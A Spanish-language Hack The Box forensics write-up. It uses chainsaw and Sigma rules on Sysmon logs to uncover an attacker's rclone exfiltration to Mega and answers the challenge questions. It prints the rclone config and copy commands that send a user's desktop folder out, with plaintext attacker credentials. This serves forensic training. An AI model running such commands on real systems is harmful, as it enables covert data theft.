---
title: "Packet Cyclone"
description: "Writeup de Packet Cyclone - Hack The Box - Forensics 200pts. Logs EVTX de Windows con Sysmon y dos reglas Sigma para detectar rclone; chainsaw hunt identifica rclone.exe configurando exfiltración a Mega con credenciales expuestas en la línea de comandos."
sidebar:
  badge:
    text: Forensics
    variant: note
tags:
  - htb
  - forensics
  - evtx
  - sysmon
  - chainsaw
  - sigma
  - rclone
  - mega
  - exfiltration
  - windows
---

# Packet Cyclone

> 🎯 Plataforma: Hack The Box
> 📂 Categoría: Forensics
> 🏆 Puntos: 200
> 👤 Autor: warrior866

---

## Descripción

El ZIP contiene una colección de logs `.evtx` de Windows (incluyendo Sysmon) y dos reglas Sigma específicas para detección de rclone. `chainsaw` es una herramienta de análisis de EVTX que soporta reglas Sigma directamente. Al ejecutar chainsaw con las reglas sobre los logs, se detectan dos eventos Sysmon: la configuración de rclone con un proveedor Mega (usuario y contraseña expuestos en la línea de comandos) y el inicio de la copia de datos al destino `remote:exfiltration`. Respondiendo las preguntas del servidor netcat con estos datos se obtiene la flag.

---

## Extracción y herramientas

```bash
unzip -P 'hackthebox' a12c7338-abf0-4840-845c-96a5ec18440f.zip -d "packet-cyclone"
cd packet-cyclone

ls
# Logs/    (149 archivos .evtx)
# sigma_rules/
#   rclone_execution.yaml
#   rclone_config_creation.yaml

# Descargar chainsaw
wget -q https://github.com/WithSecureLabs/chainsaw/releases/download/v2.6.0/chainsaw_x86_64-unknown-linux-gnu.tar.gz
tar xfz chainsaw_x86_64-unknown-linux-gnu.tar.gz
```

---

## Detección con chainsaw + Sigma

```bash
./chainsaw/chainsaw hunt \
    --sigma sigma_rules/ \
    --mapping chainsaw/mappings/sigma-event-logs-all.yml \
    Logs/
```

```
[+] Loaded 2 detection rules
[+] Loaded 149 forensic artefacts (54.3 MB)
[+] 2 Detections found on 2 documents
```

Chainsaw detecta **dos** hits de la regla `Rclone Execution via Command Line or PowerShell`:

---

## Evento 1: configuración de rclone (2023-02-24 15:35:07)

```
Event ID: 1 (Sysmon Process Create)
Computer: DESKTOP-UTDHED2
User:     wade

CommandLine: "rclone.exe" config create remote mega user majmeret@protonmail.com pass FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI
ProcessId: 3820
ParentImage: powershell.exe (PID 5888)
```

El atacante configura un remote llamado `remote` usando el proveedor de cloud storage **Mega** con credenciales expuestas en texto plano en la línea de comandos. Sysmon registra argumentos de proceso completos, lo que expone las credenciales.

---

## Evento 2: inicio de la exfiltración (2023-02-24 15:35:17)

```
Event ID: 1 (Sysmon Process Create)
CommandLine: "rclone.exe" copy C:\Users\Wade\Desktop\Relic_location\ remote:exfiltration -v
ProcessId: 5116
```

10 segundos después, rclone copia el directorio `Relic_location` del escritorio al bucket `exfiltration` en Mega.

---

## Respuestas al servidor netcat

```bash
nc 154.57.164.71 31107
```

```
Q: Email del atacante?
> majmeret@protonmail.com
[+] Correct!

Q: Contraseña del atacante?
> FBMeavdiaFZbWzpMqIVhJCGXZ5XXZI1qsU3EjhoKQw0rEoQqHyI
[+] Correct!

Q: Cloud storage provider?
> mega
[+] Correct!

Q: Process ID de la configuración de rclone?
> 3820
[+] Correct!

Q: Carpeta exfiltrada (full path)?
> C:\Users\Wade\Desktop\Relic_location
[+] Correct!

Q: Nombre del destino en el cloud?
> exfiltration
[+] Correct!

[+] Here is the flag: HTB{FLAG}
```

---

## Por qué Sysmon es tan valioso para este análisis

Sysmon (System Monitor) de Sysinternals registra eventos detallados del sistema incluyendo:
- **Event ID 1** (Process Create): nombre de proceso, comandos completos con argumentos, PID, PPID, usuario, hashes.
- **Event ID 3** (Network Connect): conexiones de red por proceso.
- **Event ID 11** (File Create): archivos creados/modificados.

Sin Sysmon, los logs de seguridad de Windows estándar solo registrarían "rclone.exe se ejecutó" sin los argumentos — las credenciales quedarían ocultas.

---

## Cadena de Ataque

```text
1. Atacante compromete la sesión del usuario "wade" en DESKTOP-UTDHED2
       ↓
2. Descarga rclone.exe a AppData\Local\Temp\ (Sysmon registra file create)
       ↓
3. 15:35:07 — rclone config create remote mega user [EMAIL] pass [PASS]
       → Configura cloud storage Mega con credenciales en texto plano
       ↓
4. 15:35:17 — rclone copy C:\Users\Wade\Desktop\Relic_location\ remote:exfiltration
       → Exfiltra el contenido completo del directorio
       ↓
5. Sysmon Event ID 1 registra ambos comandos completos → chainsaw lo detecta
```

---

## Lecciones Aprendidas

- **Credenciales en línea de comandos**: rclone y muchas otras herramientas de backup/sync aceptan credenciales como argumentos. Cualquier proceso logging (Sysmon, EDR, PowerShell Logging) los captura en texto plano.
- **Chainsaw + Sigma**: combinación poderosa para análisis masivo de EVTX. Las reglas Sigma son agnósticas a la herramienta (también funcionan en Elastic, Splunk, etc.).
- **Rclone como herramienta de Living-off-the-Land**: rclone es legítimo, no es malware — los AV no lo detectan. La detección requiere reglas contextuales (Sigma) sobre el comportamiento.
- **Sysmon como fuente gold**: si el entorno tiene Sysmon con configuración adecuada, los Event ID 1 son suficientes para reconstruir casi cualquier ataque.

---

## Referencias

- [Chainsaw — WithSecure](https://github.com/WithSecureLabs/chainsaw)
- [Sigma — reglas de detección](https://github.com/SigmaHQ/sigma)
- [Sysmon — Sysinternals](https://docs.microsoft.com/en-us/sysinternals/downloads/sysmon)
- [rclone — herramienta legítima usada en ataques](https://rclone.org/)
- [MITRE ATT&CK — Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002/)
